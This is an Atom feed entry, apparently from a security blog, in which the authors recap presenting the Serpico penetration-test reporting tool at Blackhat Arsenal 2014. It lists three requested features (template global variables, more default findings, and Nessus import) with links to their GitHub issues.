    <link href="https://www.silentrobots.com/blog/2014/08/11/blackhat-2014-arsenal-experience/"/>
    <updated>2014-08-11T17:56:34-04:00</updated>
    <id>https://www.silentrobots.com/blog/2014/08/11/blackhat-2014-arsenal-experience</id>
    <content type="html"><![CDATA[<p>Last week at Blackhat Arsenal 2014, <a href="https://github.com/parzamendi-r7">Pete</a> and I (<a href="http://www.twitter.com/_will_is_">@<em>will_is</em></a>) presented on Serpico. Arsenal was a great experience and I would highly recommend to anyone as an attendee or presenter. We got some great feedback on the project, so thank you to anyone who stopped by<!-- more -->.</p>

<p>Here were the top 3 feature requests and their associated issue on github:</p>

<h1>Global Variables</h1>

<p>This feature would allow a user to add their own variable in the UI that would render in the template. A classic use case would be to edit the Executive Summary through the UI rather than inside of a template.</p>

<p>Github Issue: <a href="https://github.com/MooseDojo/Serpico/issues/19"><del>Support &ldquo;Global Variables&rdquo; for reports</del></a> Released 08/22</p>

<h1>More Findings</h1>

<p>As of the most recent build Serpico comes with 8 findings; this is an area of active development. More than one person asked for findings from open sources such as CWE.</p>

<p>Github Issue: <a href="https://github.com/MooseDojo/Serpico/issues/20">Include 40 Findings with the default installation</a></p>

<h1>Plugin to 3rd Parties</h1>

<p>This feature would allow a user to parse findings from different vulnerability scanners and import the results.</p>

<p>Github Issue: <a href="https://github.com/MooseDojo/Serpico/issues/21">Support a connector to Nessus</a></p>
]]></content>
  </entry>
  
</feed>
